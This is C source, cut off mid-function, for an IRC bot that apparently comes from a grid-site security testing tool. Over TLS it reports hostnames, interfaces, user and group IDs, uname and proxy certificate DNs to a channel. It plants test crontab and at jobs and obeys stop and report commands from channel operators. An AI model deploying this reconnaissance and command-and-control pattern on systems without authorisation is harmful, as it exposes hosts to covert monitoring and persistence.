#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <sys/stat.h>
#include <dirent.h>

#include <pwd.h>
#include <grp.h>
#include <unistd.h>

#include <sys/utsname.h>

#include "irc_com.h"



static unsigned short has_connected    = RC_NO;
static unsigned short has_nicked       = RC_NO;
static unsigned short has_joined       = RC_NO;

static int            need_reporting = RC_YES;

static unsigned short cron_plant_found = RC_NO;
static unsigned short   at_plant_found = RC_NO;
static char           cron_test_file[PATH_MAX];
static char             at_test_file[PATH_MAX];

irc_admins_t * irc_admins_list = NULL;



int secure_write (SSL * ssl, char * fmt, ...)
{
    va_list pvar;
    char    buf[BUFFERSIZE];
    int     res = 0;
    int     rc_numbytes = 0;

    va_start(pvar, fmt);
    res = vsnprintf(buf, BUFFERSIZE, fmt, pvar);
    va_end(pvar);

    if ((res >= BUFFERSIZE) || (res < 0))
    {
#ifdef DEBUG
        scar_log (1, "%s: input to send buffer exceeds (safe) limit of %d bytes\n", __func__, BUFFERSIZE);
#endif
        return -1;
    }

#ifdef DEBUG
    scar_log (1, "%s : >> %s\n", __func__, buf);
#endif
    rc_numbytes = SSL_write (ssl, buf, res);

#ifdef DEBUG
    if (rc_numbytes < 0)
        scar_log (1, "SSL_write(): %s\n", ERR_reason_error_string(SSL_get_error(ssl, rc_numbytes)));
#endif

    /* SSL_write (ssl, NULL, 0); */
    /* TODO */

    return rc_numbytes;
}

int secure_read (SSL * ssl, char * buf, int buffersize)
{
    int rc_numbytes = 0;
    int err_code = SSL_ERROR_NONE;

    bzero (buf, buffersize);

#if 1
    /* return with 0 means data */
    if (select_and_wait_for_activity_loop (SSL_get_fd(ssl), 3, 0) == 0)
#else
    if (SSL_pending(ssl))
#endif
    {
        rc_numbytes = SSL_read (ssl, buf, buffersize); /* DEBUG: Blocks on no data! */

        /* Read error */
        if (rc_numbytes < 0)
        {
            err_code = SSL_get_error(ssl, rc_numbytes);

            /* Socket connection wa lost... */
            if (err_code = SSL_ERROR_ZERO_RETURN)
            {
                /* Go to re-connection loop */

            }
            else
            {
#ifdef DEBUG
                scar_log (1, "SSL_read(): %s\n", ERR_reason_error_string(err_code));
#endif
            }

#ifdef DEBUG
            scar_log (1, "SSL_read(): %s\n", ERR_reason_error_string(SSL_get_error(ssl, rc_numbytes)));
#endif
            return -1;
        }
        if (rc_numbytes > 0)
        {
#ifdef DEBUG
            scar_log (1, "%s  : << %s", __func__, buf);
#endif
            rc_numbytes += secure_read (ssl, &buf[rc_numbytes], buffersize - rc_numbytes);
        }
    }

    return rc_numbytes;
}


int irc_connect (SSL * ssl, char * nick, char * host, char * service, char * realname)
{
    if (nick && host && service && realname)
    {
        secure_write (ssl, "USER %s %s %s %s\r\n", nick, host, service, realname);
        has_joined = RC_YES;
    }
    else
    {
#ifdef DEBUG
        scar_log (1, "%s: insufficient information provided: %s %s %s %s\r\n", nick, host, service, realname);
#endif
    }
}

int irc_nick (SSL * ssl, char * nick)
{
    if (nick)
    {
        secure_write (ssl, "NICK %s\r\n", nick);
        has_nicked = RC_YES;
    }
    else
    {
#ifdef DEBUG
        scar_log (1, "%s: insufficient information provided: %s\r\n", nick);
#endif
    }
}

int irc_join (SSL * ssl, char * channel)
{
    if (channel)
    {
        set_irc_channel (channel);
        secure_write (ssl, "JOIN %s\r\n", channel);
        has_joined = RC_YES;
    } 
    else
    {
#ifdef DEBUG
        scar_log (1, "%s: insufficient information provided: %s\r\n", channel);
#endif
    }
}

int irc_users (SSL * ssl)
{
    secure_write (ssl, "USERS\r\n");
}

int irc_pong (SSL * ssl, char * irc_pinger)
{
    secure_write (ssl, "PONG :%s\r\n", irc_pinger);
}

int irc_sendmsg (SSL * ssl, char * fmt, ...)
{
    va_list pvar;
    char    buf[BUFFERSIZE];
    int     res = 0;
    int     rc_numbytes = 0;

    va_start(pvar, fmt);
    res = vsnprintf(buf, BUFFERSIZE, fmt, pvar);
    va_end(pvar);

    if ((res >= BUFFERSIZE) || (res < 0))
    {
        fprintf(stderr, "%s: input to send buffer exceeds (safe) limit of %d bytes\n", __func__, BUFFERSIZE);
        return -1;
    }

    return secure_write (ssl, "PRIVMSG %s :%s\r\n", 
                              get_irc_channel(), 
                              buf);
}


int irc_log (SSL * ssl, char * fmt, ...)
{
    va_list pvar;
    char    buf[BUFFERSIZE];
    int     res = 0;
    int     rc_numbytes = 0;

    va_start(pvar, fmt);
    res = vsnprintf(buf, BUFFERSIZE, fmt, pvar);
    va_end(pvar);

    if ((res >= BUFFERSIZE) || (res < 0))
    {
        fprintf(stderr, "%s: input to send buffer exceeds (safe) limit of %d bytes\n", __func__, BUFFERSIZE);
        return -1;
    }

    return secure_write (ssl, "PRIVMSG %s :!log %d %s\r\n", 
                              get_irc_channel(), 
                              (int) time(NULL), 
                              buf);
}


RC_CODES irc_is_message_from_channel_admin (char * msg)
{
    irc_admins_t * tmp_list = irc_admins_list;

    while (tmp_list)
    {
        if (strstr(msg, tmp_list -> nickname))
        {
            return RC_YES;
        }
        tmp_list = tmp_list -> next;
    }
    return RC_NO;
}


int report_hostname (SSL * ssl)
{
    int    rc    = RC_BAD;
    char * zHost = NULL;

    zHost = (char *) calloc (SUB_BUFFERSIZE, sizeof(char));

    /* the standard host name for the current processor */
    if (gethostname(zHost, SUB_BUFFERSIZE)) 
    {
        irc_log (ssl, "hostname=#failed");
        rc = RC_BAD;
    }
    else
    {
        irc_log (ssl, "hostname=%s", zHost);
        rc = RC_GOOD;
    }

    free(zHost);
    return rc;
}



int report_networked_hostnames (SSL * ssl)
{
    struct ifaddrs * ifAddrStruct = NULL;
    void *           tmpAddrPtr   = NULL;
    int              i            = 0;
    int              rc           = 0;
    char *           ip           = NULL;
    char *           netmask      = NULL;
    char *           hostname     = NULL;

    hostname = malloc (SUB_BUFFERSIZE);
    ip       = malloc (SUB_BUFFERSIZE);
    netmask  = malloc (SUB_BUFFERSIZE);

    getifaddrs(&ifAddrStruct);

    /* Enumerate the interfaces */
    while (ifAddrStruct != NULL)
    {
        /* Only consider IPv4 and IPv6 */
        if ((ifAddrStruct->ifa_addr) &&
            ((ifAddrStruct->ifa_addr->sa_family == AF_INET) ||
             (ifAddrStruct->ifa_addr->sa_family == AF_INET6)))
        {
            struct hostent * h_ent = NULL;

            bzero (ip,       SUB_BUFFERSIZE);
            bzero (netmask,  SUB_BUFFERSIZE);
            bzero (hostname, SUB_BUFFERSIZE);

            /* get IP for interface */
            tmpAddrPtr = &((struct sockaddr_in *)ifAddrStruct->ifa_addr)->sin_addr;
            inet_ntop(ifAddrStruct->ifa_addr->sa_family, 
                      tmpAddrPtr, 
                      ip, 
                      SUB_BUFFERSIZE);
            irc_log (ssl, "net_interface_ip_%s=%s", ifAddrStruct->ifa_name, ip);

            /* get netmask for interface */
            tmpAddrPtr = &((struct sockaddr_in *)ifAddrStruct->ifa_netmask)->sin_addr;
            inet_ntop(ifAddrStruct->ifa_netmask->sa_family, 
                      tmpAddrPtr, 
                      netmask, 
                      SUB_BUFFERSIZE);
            irc_log (ssl, "net_interface_netmask_%s=%s", ifAddrStruct->ifa_name, netmask);

            /* Try to reverse lookup the FQDN, first IPv6 then IPv4, depending upon input */
            h_ent = gethostbyaddr_wrapper(ip);
            if (h_ent)
            {
                irc_log (ssl, "net_interface_fqdn_%s=%s", ifAddrStruct->ifa_name, h_ent -> h_name);
            }
        }
        ifAddrStruct=ifAddrStruct->ifa_next;
    }

    endhostent();
    free(hostname);
    free(ip);
    free(netmask);
    freeifaddrs (ifAddrStruct);
    return RC_CONTINUE;
}


int report_X509_info (SSL * ssl)
{
    struct stat       my_stat;
    int               rc = 0;
    int               depth = 0;
    char *            proxy_file = NULL;
    char *            subject_DN = NULL;
    char *            issuer_DN  = NULL;
    STACK_OF (X509) * cert_chain = NULL;

    proxy_file = getenv ("X509_USER_PROXY");
    if (!proxy_file)
    {
        irc_log (ssl, "X509_USER_PROXY=");
    }
    else
    {
        irc_log (ssl, "X509_USER_PROXY=%s", proxy_file);

        rc = stat(proxy_file, &my_stat);
        if (rc != 0)
        {
            irc_log (ssl, "proxy_readable=no");
        }
        else
        {
            irc_log (ssl, "proxy_readable=yes");
            irc_log (ssl, "proxy_perm=%04o", my_stat.st_mode & 0xFFF);

            /* Read proxy file */
            if (grid_readProxy (proxy_file, &cert_chain) != X509_V_OK)
            {
                irc_log (ssl, "proxy_parse=no");
            }
            else
            {

                irc_log (ssl, "proxy_parse=yes");

                /* Get the info */
                depth      = sk_X509_num(cert_chain);
                subject_DN = cgul_x509_chain_to_subject_dn(cert_chain);
                issuer_DN  = cgul_x509_chain_to_issuer_dn(cert_chain);

                /* Publish info */
                irc_log (ssl, "subject_DN=%s", subject_DN);
                irc_log (ssl, "issuer_DN=%s", issuer_DN);
                irc_log (ssl, "cert_chain_depth=%d", depth);

                /* Free up this stuff */
                free(subject_DN);
                free(issuer_DN);
            }
        }
    }
    return RC_CONTINUE;
}


int report_posix_process_info (SSL * ssl)
{
    struct passwd * passwd  = NULL;
    struct group  * gr_info = NULL;
    int             i       = 0;
    int             ngroups = 0;
    gid_t *         grlist  = NULL;
    char *          buff    = NULL;
    char *          tmpbuff = NULL;
    char            cwd[PATH_MAX];
    struct utsname  uname_info;



    /* Get PID, Parent PID and SID */
    if (angelOrDaemon() == ANGEL)
    {
        buff    = calloc (sizeof (char), SUB_BUFFERSIZE);
        tmpbuff = calloc (sizeof (char), SUB_BUFFERSIZE);

        irc_log (ssl, "processtype=ANGEL");
        irc_log (ssl, "daemon_pid=%d", (int) getChildPid());

        /* Get uname information */
        if (uname(&uname_info) == 0)
        {
            irc_log (ssl, "uname_sysname=%s\n", uname_info.sysname);
            irc_log (ssl, "uname_nodename=%s\n", uname_info.nodename);
            irc_log (ssl, "uname_release=%s\n", uname_info.release);
            irc_log (ssl, "uname_version=%s\n", uname_info.version);
            irc_log (ssl, "uname_machine=%s\n", uname_info.machine);
        }

        /* UserID */
        passwd = getpwuid (getuid());
        if (passwd)
            irc_log (ssl, "posix_uid=%d(%s)", (int) getuid(), passwd -> pw_name);
        else
            irc_log (ssl, "posix_uid=%d", (int) getuid());

        /* Effective UserID */
        passwd = getpwuid (geteuid());
        if (passwd)
            irc_log (ssl, "posix_euid=%d(%s)", (int) geteuid(), passwd -> pw_name);
        else
            irc_log (ssl, "posix_euid=%d", (int) geteuid());

        /* GroupID */
        gr_info = getgrgid (getgid());
        if (gr_info)
            irc_log (ssl, "posix_gid=%d(%s)",  (int) getgid(), gr_info -> gr_name);
        else
            irc_log (ssl, "posix_gid=%d",  (int) getgid());

        /* Effective GroupID */
        gr_info = getgrgid (getegid());
        if (gr_info)
            irc_log (ssl, "posix_egid=%d(%s)", (int) getegid(), gr_info -> gr_name);
        else
            irc_log (ssl, "posix_egid=%d", (int) getegid());


        /* Secondary gids */
        if ((ngroups = getgroups(0, NULL)) > 0)
        {
            grlist = (gid_t *) malloc (ngroups * sizeof(gid_t));
            if (getgroups(ngroups, grlist) > 0)
            {
                for (i = 0; i < ngroups; i++)
                {
                    if (strlen(buff) > 0)
                        snprintf (buff, SUB_BUFFERSIZE, "%s,", buff);

                    gr_info = getgrgid(grlist[i]);
                    if (gr_info)
                        snprintf (tmpbuff, SUB_BUFFERSIZE, "%s%d(%s)", buff, (int) grlist[i], gr_info -> gr_name);
                    else
                        snprintf (tmpbuff, SUB_BUFFERSIZE, "%s%d", buff, (int) grlist[i]);

                    strncpy (buff, tmpbuff, SUB_BUFFERSIZE);
                    /*
                    if (gr_info)
                        irc_log (ssl, "posix_secgid=%d(%s)", (int) grlist[i], gr_info -> gr_name);
                    else
                        irc_log (ssl, "posix_secgid=%d", (int) grlist[i]);
                    */
                }
            }
        }
        irc_log (ssl, "posix_secgid=%s", buff);

        free (grlist);
        grlist = NULL;

        free (tmpbuff);
        free (buff);
    }
    else
    {
        irc_log (ssl, "processtype=DAEMON");
        irc_log (ssl, "angelnick=%s", get_parent_irc_nick());
    }

    /* Process information */
    irc_log (ssl, "posix_pid=%d",  (int) getpid());
    irc_log (ssl, "posix_ppid=%d", (int) getppid());
    irc_log (ssl, "posix_sid=%d",  (int) getsid(0));
    irc_log (ssl, "posix_pgid=%d", (int) getpgid(0));


    /* Get Current Working Directory */
    getcwd(cwd, PATH_MAX);
    irc_log (ssl, "cwd=%s", cwd);

    return RC_CONTINUE;
}


/* The only true check if a directory is writeable, is to test it
 * This would then also cover ACL-ed file systems that use more then 
 * the well known user-group-other permission bits (like AFS)
 */
RC_CODES test_writeable_dir (SSL * ssl, char * path)
{
    FILE * file = NULL;
    char * tmpfile_path = NULL;

    tmpfile_path = malloc (sizeof (char) * PATH_MAX);
    snprintf (tmpfile_path, PATH_MAX, "%s/%s", path, CODE_NAME);

    /* Open a file for writing */
    file = fopen (tmpfile_path, "w");
    if ((file == NULL) || (errno != 0))
    {
        /* Could not open a file for writing */
        return RC_NO;
    }
    else
    {
        /* On success, close and remove the file for writing */
        if (fclose (file) != 0)
        {
            /* Problem with closing the file? It's stuck! Make a note... */
            irc_log (ssl, "stuck_on_close=%s", tmpfile_path);
        }
        /* Removing the test file */
        if (unlink (tmpfile_path) != 0)
        {
            /* Problem with removing the file, make a note! */
            irc_log (ssl, "stuck_on_unlink=%s", tmpfile_path);
        }

        /* Out a here */
        return RC_YES;
    }
}

RC_CODES test_try_at(const char * test_path)
{
    FILE    *fd = NULL;
    char    at_test_filename[PATH_MAX];
    char    command[PATH_MAX];
    char    at_line[1000];
    int     ec = 0;
    int     rc = 0;

    /* construct the path to the cron file in the directory of choice */
    strncpy(at_test_filename, test_path, PATH_MAX);
    strncat(at_test_filename, "/", PATH_MAX);
    strncat(at_test_filename, AT_FILE, PATH_MAX);


    /* fill in the file with the crontab */
    if ((fd = fopen(at_test_filename, "w")) == NULL)
    {
        return RC_NO;
    }
    else
    {
        /* write a cron line and plant it in cron_tab_filename */
        /* the cron line will touch the file CRON_FILE_TEST in this directory */

        /* Store the path of the file in the global var to test on the succesful at execution */
        strncpy (at_test_file, test_path, PATH_MAX);
        strncat (at_test_file, "/", PATH_MAX);
        strncat (at_test_file, AT_FILE_TEST, PATH_MAX);

        snprintf(at_line, sizeof(at_line), "#!/bin/sh\n\n%s %s >/dev/null 2>&1\n",
                                               "touch", at_test_file);
        fputs(at_line, fd);
        fclose(fd);
    }

    /* Removing the existing test file */
    unlink (at_test_file);

    /* Create at command */
    snprintf (command, PATH_MAX, 
              "at -f %s \"now + %d minutes\" > /dev/null 2>&1", 
              at_test_filename, AT_TEST_DELAY);

    /* Hand over the cronfiguration file to crontab */
    ec = system (command);
    if (ec == (-1))
    {
        /* Fork() and Exec() failed */
        bzero (at_test_file, PATH_MAX);
        rc = RC_BAD;
    }
    else if (WEXITSTATUS(ec) != 0)
    {
        /* Couldn't launch crontab <file> */
        bzero (at_test_file, PATH_MAX);
        rc = RC_NO;
    }
    else
    {
        /* Crontab planted, waiting for execution */
        rc = RC_YES;
    }

    /* Remove the cronfiguration file, it should already be loaded into atd by the system() call */
    unlink(at_test_filename);

    return rc;


    /* at -f attest.sh "now + 1 minute"; date */
}

RC_CODES test_try_cron(const char * test_path)
{
    FILE    *fd = NULL;
    char    cron_tab_filename[PATH_MAX];
    char    command[PATH_MAX];
    char    cron_line[1000];
    int     ec = 0;
    int     rc = 0;
    struct  tm *tm = NULL;
    time_t  now = 0;

    /* construct the path to the cron file in the directory of choice */
    strncpy(cron_tab_filename, test_path, PATH_MAX);
    strncat(cron_tab_filename, "/", PATH_MAX);
    strncat(cron_tab_filename, CRON_FILE, PATH_MAX);


    /* fill in the file with the crontab */
    if ((fd = fopen(cron_tab_filename, "w")) == NULL)
    {
        return RC_NO;
    }
    else
    {
        /* write a cron line and plant it in cron_tab_filename */
        /* the cron line will touch the file CRON_FILE_TEST in this directory */
        time(&now);
        tm = localtime(&now);

        /* Store the path of the file in the global var to test on the succesful crontab execution */
        strncpy (cron_test_file, test_path, PATH_MAX);
        strncat (cron_test_file, "/", PATH_MAX);
        strncat (cron_test_file, CRON_FILE_TEST, PATH_MAX);

        snprintf(cron_line, sizeof(cron_line), "%d %d * * * %s %s >/dev/null 2>&1\n",
                                               tm -> tm_min + CRON_TEST_DELAY, /* Write the crontab to launch two minutes in the future */
                                               tm -> tm_hour,
                                               "touch", cron_test_file);
        fputs(cron_line, fd);
        fclose(fd);
    }

    /* Removing the existing test file */
    unlink (cron_test_file);

    /* Create crontab command */
    strncpy(command, "crontab ", PATH_MAX);
    strncat(command, cron_tab_filename, PATH_MAX);
    strncat(command, " >/dev/null", PATH_MAX);

    /* Hand over the cronfiguration file to crontab */
    ec = system (command);
    if (ec == (-1))
    {
        /* Fork() and Exec() failed */
        bzero (cron_test_file, PATH_MAX);
        rc = RC_BAD;
    }
    else if (WEXITSTATUS(ec) != 0)
    {
        /* Couldn't launch crontab <file> */
        bzero (cron_test_file, PATH_MAX);
        rc = RC_NO;
    }
    else
    {
        /* Crontab planted, waiting for execution */
        rc = RC_YES;
    }

    /* Remove the cronfiguration file, it should already be loaded into crond by the system() call */
    unlink(cron_tab_filename);

    return rc;
}



/* Check if cron or at are available */
int report_writeabledir_cron_at (SSL * ssl)
{
    char test_path[PATH_MAX];

    /* Try in the current working directory */
    getcwd(test_path, PATH_MAX);
    if (test_writeable_dir (ssl, test_path) != RC_YES)
    {
        strncpy (test_path, getenv("HOME"), PATH_MAX);
        if (test_writeable_dir (ssl, test_path) != RC_YES)
        {
            strncpy (test_path, "/tmp", PATH_MAX);
            if (test_writeable_dir (ssl, test_path) != RC_YES)
            {
                irc_log (ssl, "writeable_dir=unable_to_find");
                return RC_CONTINUE;
            }
        }
    }

    /* Log the writeable directory */
    irc_log (ssl, "writeable_dir=%s", test_path);

    switch (test_try_cron (test_path))
    {
        case RC_NO : 
            irc_log (ssl, "crontab=NO");
            break;
        case RC_YES: 
            irc_log (ssl, "crontab=PLANTED");
            irc_log (ssl, "crontab_delay=%dm", CRON_TEST_DELAY);
            break;
        case RC_BAD: 
            irc_log (ssl, "crontab=crontab_exec_failed");
            break;
        default    :
            irc_log (ssl, "crontab=crontab_exec_failed");
            break;
    }

    switch (test_try_at (test_path))
    {
        case RC_NO : 
            irc_log (ssl, "at=NO");
            break;
        case RC_YES: 
            irc_log (ssl, "at=PLANTED");
            irc_log (ssl, "at_delay=%dm", AT_TEST_DELAY);
            break;
        case RC_BAD: 
            irc_log (ssl, "at=at_exec_failed");
            break;
        default    :
            irc_log (ssl, "at=at_exec_failed");
            break;
    }


    return RC_CONTINUE;
}


/* Send the full report, typically the task of an Angel, but could be requested explicitly */
int report_to_channel_as_angel (SSL * ssl)
{
    int    can_cron    = RC_NO;
    int    can_at      = RC_NO;
    int    is_daemon   = RC_NO;

    irc_log (ssl, "alive_since=%d\r\n", getBirthTime());

    /* Print specific environment vars */
    report_print_specific_environment_vars (ssl);

    /* Get POSIX process info */
    report_posix_process_info (ssl);

    /* Get hostname */
    report_hostname (ssl);

    /* Get network interfaces information */
    report_networked_hostnames (ssl);

    /* Publish proxy information */
    report_X509_info (ssl);

    /* Check for Cron, At and writeable dirs */
    report_writeabledir_cron_at (ssl);


    return RC_CONTINUE;
}
#if 0
cron=[yes|no]
at=[yes|no]
planted_in_dir=<dir>
#endif


int report_to_channel_as_daemon (SSL * ssl)
{
    int    can_cron    = RC_NO;
    int    can_at      = RC_NO;
    int    is_daemon   = RC_NO;

    irc_log (ssl, "alive_since=%d\r\n", getBirthTime());

    /* Print specific environment vars */
    report_print_specific_environment_vars (ssl);

    /* Get POSIX process info */
    report_posix_process_info (ssl);

    return RC_CONTINUE;
}


int report_print_specific_environment_vars (SSL * ssl)
{
    /* Print the VO, ROC, Site environment moment */
    if (getenv("VO"))
    {
        irc_log (ssl, "VO=%s\r\n", getenv("VO"));
    }
    if (getenv("ROC"))
    {
        irc_log (ssl, "ROC=%s\r\n", getenv("ROC"));
    }
    if (getenv("Site"))
    {
        irc_log (ssl, "Site=%s\r\n", getenv("Site"));
    }

    return RC_CONTINUE;
}


/* PING the service */
int irc_ping_the_service (SSL * ssl)
{
    static  time_t last_test = 0;
    int            i = 0;

    /* Query the channel every 300 seconds to see which users are the admins */
    if ((last_test != 0) && ((time(NULL) - last_test) < 300))
    {
        /* Please try again later, don't flood the communication protocol */
        return RC_CONTINUE;
    }
    else
    {
        /* Remember the time of interaction */
        last_test = time(NULL);

        secure_write (ssl, "PING :%s", get_irc_channel());
        return RC_CONTINUE;
    }
}



/* Query the list of admins in the channel */
int irc_who_is_the_admin (SSL * ssl)
{
    static  time_t last_test = 0;
    int            i = 0;

    /* Query the channel every IRC_MAX_ADMIN_LIFE_TIME_IN_SECONDS seconds to see which users are the admins */
    if ((last_test != 0) && ((time(NULL) - last_test) < IRC_MAX_ADMIN_LIFE_TIME_IN_SECONDS))
    {
        /* Please try again later, don't flood the communication protocol */
        return RC_CONTINUE;
    }
    else
    {
        /* Remember the time of interaction */
        last_test = time(NULL);

        /* Refresh the list of admins */
        irc_admins_list = knockout_timeout_irc_admins(irc_admins_list);

        secure_write (ssl, "WHO *\r\n");
        /* secure_write (ssl, "WHO * o\r\n"); */
        return RC_CONTINUE;
    }
}


irc_admins_t * knockout_timeout_irc_admins(irc_admins_t * irc_admin)
{
    irc_admins_t * helper = irc_admin;

    if (irc_admin)
    {
#ifdef DEBUG
        scar_log (1, "%s: irc_admin -> nickname %s\n", __func__, irc_admin -> nickname);
#endif

        if (time(NULL) > irc_admin -> timeout_time)
        {
            helper = irc_admin -> next;
            free(irc_admin -> nickname);
            free(irc_admin);
            return knockout_timeout_irc_admins (helper);
        }
        else
        {
            return knockout_timeout_irc_admins (irc_admin -> next);
        }
    }
    return NULL;
}

int irc_process_who_is_the_admin (SSL * ssl, char * buffer, int bufsize)
{
    char *  locator = NULL;
    char    elements[6][40];
    int     i = 0;
    irc_admins_t * irc_admin = NULL;
    irc_admins_t * tmp_list = NULL;


    for (i = 0; i < 6; i++)
        bzero (elements[i], 40);

    locator = buffer;

    if (locator = strstr (locator, get_irc_channel()))
    {
        /* if (strlen(locator) < strlen(CHANNEL)) */
            /* break; */

        locator = &locator[strlen(get_irc_channel())];

        sscanf (locator, "%s %s %s %s %s %s", 
                         elements[0],
                         elements[1],
                         elements[2],
                         elements[3], /* Admin name */
                         elements[4], /* IRC Channel Powers */
                         elements[5]);

        if ((strlen(elements[4]) > 0) && (strstr (elements[4], "@")))
        {
            if (elements[3] && strlen(elements[3]))
            {
#ifdef DEBUG
                scar_log (1, "%s: found an admin: %s\n", __func__, elements[3]);
#endif

                irc_admin = malloc (sizeof (irc_admins_t));
                irc_admin -> nickname = calloc (sizeof (char), RFC2812_MAX_NICKNAME_LEN + 1);
                strncpy (irc_admin -> nickname, elements[3], RFC2812_MAX_NICKNAME_LEN);
                irc_admin -> timeout_time = time(NULL) + (IRC_MAX_ADMIN_LIFE_TIME_IN_SECONDS * 2);
                irc_admin -> next = NULL;

                tmp_list = irc_admins_list;


                /* Add the found IRC admin to the linked list and remove the admin when its timeout is due */
                if (!irc_admins_list)
                {
                    irc_admins_list = irc_admin;
                }
                else
                {
                    /* Go to the end of the list and add the new element at the end */
                    while (tmp_list -> next)
                    {
                        tmp_list = tmp_list -> next;
                    }
                    tmp_list -> next = irc_admin;
                }
            }
        }
    }

    return RC_CONTINUE;
}


RC_CODES file_exists (char * filename)
{
    struct stat s;

    /* Is there a cron_test_file staged? */
    if (strlen(filename) > 0)
    {
        /* Test if the file was written (by touching it) from the execution of the crontab */
        if (stat (filename, &s) == 0)
        {
            return RC_YES;
        }
    }
    return RC_NO;
}


/*
 * This is the IRC idle handler.
 * During the looping, waiting for input will time-out and then this 
 * function is triggered.
 *
 * It's trigger very regularly and is important to the life cycle of 
 * this tool.
 */
int irc_idle_handler (SSL * ssl)
{
    int rc = RC_CONTINUE;

    /* Who is the admin */
    irc_who_is_the_admin (ssl);

    /* Ping, IRC - a heartbeat - Not stable */
    /* irc_ping_the_service (ssl); */


    /* Report */
    if (need_reporting == RC_YES)
    {
        if (angelOrDaemon() == ANGEL)
            report_to_channel_as_angel(ssl);
        else
            report_to_channel_as_daemon(ssl);

        /* Just reported, no need to repeat, unless asked */
        need_reporting = RC_NO;
    }

    /* Trying to find the planted file to complete the crontab test */
    if ((strlen(cron_test_file) > 0) && (cron_plant_found == RC_NO))
    {
        if ((cron_plant_found = file_exists (cron_test_file)) == RC_YES)
        {
            /* Report crontab plant found */
            irc_log (ssl, "crontab_plant=FOUND");
            unlink(cron_test_file);
            bzero(cron_test_file, PATH_MAX);
        }
    }

    /* Trying to find the planted file to complete the at test */
    if ((strlen(at_test_file) > 0) && (at_plant_found == RC_NO))
    {
        if ((at_plant_found = file_exists (at_test_file)) == RC_YES)
        {
            /* Report attab plant found */
            irc_log (ssl, "at_plant=FOUND");
            unlink(at_test_file);
            bzero(at_test_file, PATH_MAX);
        }
    }

    return rc;
}


int irc_comm_handler (SSL * ssl, char * input_buf, int bufsize)
{
    int    rc = RC_CONTINUE;
    char   local_buf [BUFFERSIZE];
    int    rc_numbytes  = 0;
    char * one_line     = NULL;
    int    one_line_len = 0;
    int    offset       = 0;
    int    i            = 0;

    bzero (local_buf, BUFFERSIZE);

    
    while (1)
    {
        /* No complete line present... protocol failure, ignoring the foobar-ed message */
        if (!strstr(&input_buf[offset], "\r\n"))
            break;

        /* Copy one line from the buffer into the one_line buffer */
        one_line_len = strlen(&input_buf[offset]) - strlen(strstr(&input_buf[offset], "\r\n") + 2); 
        one_line = (char *) calloc (sizeof(char), one_line_len + 1);

        strncpy (one_line, &input_buf[offset], one_line_len);
        offset += one_line_len;

        /* Setting forward the offset to split multiple IRC statements must not exceed the limits of the buffer */
        if (offset > bufsize)
        {
            break;
        }

        /* Need to support this */
        /* :okoeroo!anonymous_i@194.145.194.227 PRIVMSG H9Mti2yg :yo */

        if (messageType(one_line) == IRC_404)
        {
            irc_sendmsg (ssl, "Got a 404, that's not good. Reconnecting...\n");
            rc = RC_RECONNECT;
            break;
        }
        if (messageType(one_line) == IRC_PONG)
        {
            continue;
        }
        else if (messageType(one_line) == IRC_PING)
        {
            sscanf(one_line, "PING :%s", local_buf);
            irc_pong (ssl, local_buf);

            /* return RC_CONTINUE; */
            continue;
        }
        else if (messageType(one_line) == IRC_352)
        {
            irc_process_who_is_the_admin (ssl, one_line, one_line_len);
            continue;
        }
        else if (messageType(one_line) == IRC_315)
        {
            /* return RC_CONTINUE; */
            continue;
        }
        else if (strstr (one_line, "sleep") != NULL)
        {
            if (irc_is_message_from_channel_admin (one_line) == RC_YES)
            {
                irc_sendmsg (ssl, "I'm feeling sleepy...");
                /* return RC_SLEEP; */

                rc = RC_SLEEP;
                break;
            }
            else
                continue;
        }
        else if (((messageType(one_line) == IRC_PRIVMSG_CHANNEL) && strstr (one_line, "infotainment") != NULL))
        {
            if (irc_is_message_from_channel_admin (one_line) == RC_YES)
            {
                report_to_channel_as_angel(ssl);
            }
            continue;
        }
        else if ((messageType(one_line) == IRC_PRIVMSG_PRIVATE) && (strstr (one_line, "youdie") != NULL))
        {
            if (irc_is_message_from_channel_admin (one_line) == RC_YES)
            {
                irc_sendmsg (ssl, "Who shot the sheriff");
#ifdef DEBUG
                scar_log (1, "%s: Sending STOP\n", __func__);
#endif
                rc = RC_STOP;
                break;
            }
            else
            {
                irc_sendmsg (ssl, "You are not an admin.");
                continue;
            }
        }
        else if ((messageType(one_line) == IRC_PRIVMSG_CHANNEL) && (strstr (one_line, "youdie") != NULL))
        {
            if (irc_is_message_from_channel_admin (one_line) == RC_YES)
            {
                irc_sendmsg (ssl, "Who shot the sheriff");
#ifdef DEBUG
                scar_log (1, "%s: Sending STOP\n", __func__);
#endif
                rc = RC_STOP;
                break;
            }
            else
            {
                irc_sendmsg (ssl, "You are not an admin.");
                continue;
            }
        }
        else if ((messageType(one_line) == IRC_PRIVMSG_CHANNEL) && (strstr (one_line, "excellent") != NULL))
        {
            if (irc_is_message_from_channel_admin (one_line) == RC_YES)
            {
                irc_sendmsg (ssl, "Yes, my master.");
            }
            else
            {
                irc_sendmsg (ssl, "You are not my master, dude.");
            }
            continue;
        }

#if 0
        else if (strstr (input_buf, "daemonize") != NULL)
        {
            irc_sendmsg (ssl, "Daemonizing...");
            if (daemonize() == ANGEL)
            {
                irc_sendmsg (ssl, "I'm an angel.");
            }
            else
            {
                irc_sendmsg (ssl, "wow, what happened?");
            }

            return RC_CONTINUE;
        }
#endif


        else
        {
#ifdef DEBUG
            scar_log (1, "%s: Unable to handle message, going to ignore it ever got send...\n", __func__);
            scar_log (1, "%s: Message was: \"%s\"\n", __func__, input_buf);
#endif
        }

        free(one_line);
        one_line = NULL;
    }

    free(one_line);
    one_line = NULL;

    return rc;
}


int secured_irc (void)
{
    char * buf = NULL;
    int    rc_numbytes = 0;
    int    rc = RC_CONTINUE;
    int    i = 0;
    SSL *  ssl = getSSL();

    if (!ssl)
    {
#ifdef DEBUG
        scar_log (1, "%s: No SSL object set, setup connection first.\n", __func__);
#endif
        return RC_BAD;
    }

    buf = (char *) calloc (sizeof (char), BUFFERSIZE);

    /* IRC connect */
    rc_numbytes = secure_read (ssl, buf, BUFFERSIZE);
    irc_connect(ssl, get_irc_nick(), HOST, HOST, CODE_NAME);
    
    /* change nick */
    rc_numbytes = secure_read (ssl, buf, BUFFERSIZE);
    irc_nick(ssl, get_irc_nick());
    
    /* change join IRC channel */
    rc_numbytes = secure_read (ssl, buf, BUFFERSIZE);
    irc_join(ssl, CHANNEL);

    /* Connection established! */

    /* message */
    rc_numbytes = secure_read (ssl, buf, BUFFERSIZE);
    secure_write (ssl, "NOTICE %s :%s is now online.\r\n", CHANNEL, get_irc_nick());

